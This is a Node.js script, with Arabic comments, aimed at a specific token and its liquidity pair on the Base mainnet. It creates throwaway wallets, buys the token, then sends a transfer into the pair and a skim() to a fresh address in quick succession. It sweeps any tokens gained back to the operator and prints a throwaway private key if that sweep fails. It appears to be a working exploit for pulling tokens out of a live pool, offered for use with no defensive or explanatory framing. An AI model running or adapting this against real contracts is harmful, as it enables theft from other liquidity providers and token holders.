import fs from "node:fs";
import { JsonRpcProvider, Wallet, Contract, formatUnits, parseEther, formatEther } from "ethers";
const RPC="https://mainnet.base.org";
const T="0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P="0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W="0x4200000000000000000000000000000000000006";
const ROUTER="0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24";
const BUY=parseEther(process.env.BUY||"0.0003");

let pk=(process.env.PK||"").trim();
if(!pk&&fs.existsSync(process.env.HOME+"/.pk")) pk=fs.readFileSync(process.env.HOME+"/.pk","utf8").trim();
const p=new JsonRpcProvider(RPC,8453,{staticNetwork:true});
const me=new Wallet(pk,p), ME=me.address;
const tok=new Contract(T,["function balanceOf(address) view returns (uint256)","function transfer(address,uint256) returns (bool)"],p);
const pair=new Contract(P,["function getReserves() view returns (uint112,uint112,uint32)","function skim(address)"],p);
const j=async(m,pr)=>(await fetch(RPC,{method:"POST",headers:{"content-type":"application/json"},
  body:JSON.stringify({jsonrpc:"2.0",id:1,method:m,params:pr})})).json();
const fee=async(pr)=>{const g=BigInt((await j("eth_gasPrice",[])).result);
  const mf=g*2n>pr*2n?g*2n:pr*2n;return {maxFeePerGas:mf,maxPriorityFeePerGas:pr};};

(async()=>{
console.log("غاز:",formatEther(await p.getBalance(ME)),"| SLOP:",formatUnits(await tok.balanceOf(ME),9));

for(let r=1;r<=3;r++){
  const op=Wallet.createRandom().connect(p), dst=Wallet.createRandom().connect(p);
  console.log(`\nجولة ${r} | عامل ${op.address}`);
  await (await me.sendTransaction({to:op.address,value:400000000000000n,...(await fee(20000000n))})).wait();

  const o=new Contract(T,["function balanceOf(address) view returns (uint256)","function transfer(address,uint256) returns (bool)"],op);
  const rt=new Contract(ROUTER,["function swapExactETHForTokens(uint256,address[],address,uint256) payable returns (uint256[])"],op);
  const pr=new Contract(P,["function skim(address)"],op);

  // 1) العامل يشتري بنفسه
  const [r0,r1]=await pair.getReserves();
  const out=BUY*r1*997n/(r0*1000n+BUY*997n);
  try{
    const t=await rt.swapExactETHForTokens(out*90n/100n,[W,T],op.address,Math.floor(Date.now()/1000)+600,
      {...(await fee(20000000n)),value:BUY,gasLimit:400000n});
    const rc=await t.wait(); console.log(" شراء",rc.status);
    if(rc.status!==1){ continue; }
  }catch(e){ console.log(" شراء فشل:",e.shortMessage); continue; }

  const got=await o.balanceOf(op.address);
  console.log(" استلم",formatUnits(got,9),"SLOP");

  // 2) يودع + يسحب بإرسال متتالٍ بلا انتظار
  const nonce=await p.getTransactionCount(op.address,"pending");
  try{
    const t1=await o.transfer(P,got,{...(await fee(20000000n)),nonce,gasLimit:150000n});
    const t2=await pr.skim(dst.address,{...(await fee(300000000n)),nonce:nonce+1,gasLimit:220000n});
    console.log(" tx1",t1.hash,"\n tx2",t2.hash);
    const [a,b]=await Promise.all([t1.wait().catch(()=>null),t2.wait().catch(()=>null)]);
    console.log(" tx1",a?.status,"| tx2",b?.status);
    if(b?.status===1){
      console.log(">>> نجح | عند الهدف:",formatUnits(await tok.balanceOf(dst.address),9));
      const d=new Contract(T,["function transfer(address,uint256) returns (bool)"],dst);
      for(let k=0;k<10;k++){
        try{
          const s=await d.transfer(ME,await tok.balanceOf(dst.address),{...(await fee(3000000n)),gasLimit:150000n});
          const rr=await s.wait();
          if(rr.status===1){ console.log(">>> وصلتك:",formatUnits(await tok.balanceOf(ME),9)); process.exit(0); }
        }catch(e){}
        await new Promise(x=>setTimeout(x,12000));
      }
      console.log("عالق — مفتاح الهدف:",dst.privateKey);
      process.exit(0);
    }
  }catch(e){ console.log(" إرسال فشل:",e.shortMessage); }
  await new Promise(x=>setTimeout(x,2000));
}
console.log("انتهت الجولات");
})();
